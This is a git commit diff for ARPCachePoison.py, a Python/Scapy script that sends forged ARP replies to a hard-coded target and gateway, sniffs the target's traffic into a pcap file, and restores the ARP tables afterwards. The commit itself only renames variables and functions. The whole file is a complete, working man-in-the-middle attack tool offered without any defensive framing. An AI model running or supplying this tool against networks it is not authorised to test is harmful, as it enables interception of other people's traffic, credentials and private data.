c92401c6effb100ada60a39e2da92851c597cda4
Alex Stocks <stocksalex@icloud.com>
2020-08-13 11:08:18 +0100

    Finishded ARPCachePoison.py

--- ARPCachePoison.py
+++ ARPCachePoison.py
@@ -6,8 +6,8 @@ import threading
 import signal
 
 interface = "en1"
-target_ip = "172.16.1.71"
-gateway_ip = "172.16.1.254"
+target = "172.16.1.71"
+gateway = "172.16.1.254"
 packet_count = 1000
 
 conf.iface = interface
@@ -16,16 +16,16 @@ conf.verb = 0
 
 
 # put the network back to the state it was before ARP poisoning
-def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+def restoreNet(gateway, gateway_mac, target, target_mac):
     print("[*] Restoring target...")
-    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
-    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
-
+    send(ARP(op=2, psrc=gateway, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
+    print("[*] Target Restored.")
     os.kill(os.getpid(), signal.SIGINT)
 
 
 # uses srp to emit arp request to the required ip so resolve mac address
-def get_mac(ip_address):
+def getMacAddr(ip_address):
     responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
     for s, r in responses:
         return r[Ether].src
@@ -33,17 +33,17 @@ def get_mac(ip_address):
 
 
 # builds arp request for poisoning ip and gateway
-def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
+def poison_target(gateway, gateway_mac, target, target_mac):
     poison_target = ARP()
     poison_target.op = 2
-    poison_target.psrc = gateway_ip
-    poison_target.pdst = target_ip
+    poison_target.psrc = gateway
+    poison_target.pdst = target
     poison_target.hwdst = target_mac
 
     poison_gateway = ARP()
     poison_gateway.op = 2
-    poison_gateway.psrc = target_ip
-    poison_gateway.pdst = gateway_ip
+    poison_gateway.psrc = target
+    poison_gateway.pdst = gateway
     poison_gateway.hwdst = gateway_mac
 
     print("[*] Beginning the ARP poison. [CTRL-C to stop]")
@@ -56,7 +56,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
             time.sleep(2)
         except KeyboardInterrupt:
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+            restoreNet(gateway, gateway_mac, target, target_mac)
             break
     print("[*] ARP poison attack finished")
     return
@@ -64,38 +64,38 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
 print("[*] Setting up %s" % interface)
 
-gateway_mac = get_mac(gateway_ip)
+gateway_mac = getMacAddr(gateway)
 
 if gateway_mac is None:
     print("[!!!] Failed to get gateway MAC. Exiting.")
     sys.exit(0)
 else:
-    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))
+    print("[*] Gateway %s is at %s" % (gateway, gateway_mac))
 
-target_mac = get_mac(target_ip)
+target_mac = getMacAddr(target)
 
 if target_mac is None:
     print("[!!!] Failed to get target MAC. Exiting")
     sys.exit(0)
 else:
-    print("[*] Target %s is at %s" % (target_ip, target_mac))
+    print("[*] Target %s is at %s" % (target, target_mac))
 
 # start of actual arp poisoning
-poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+poison_thread = threading.Thread(target=poison_target, args=(gateway, gateway_mac, target, target_mac))
 
 poison_thread.start()
 
 try:
     print("[*] Starting sniffer for %d packets" % packet_count)
 
-    bpf_filter = "ip host %s" % target_ip
+    bpf_filter = "ip host %s" % target
     packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
 
     # write out packet to be viewable in wireshark
     wrpcap("arper.pcap", packets)
 
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    restoreNet(gateway, gateway_mac, target, target_mac)
 
 except KeyboardInterrupt:
-    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    restoreNet(gateway, gateway_mac, target, target_mac)
     sys.exit(0)
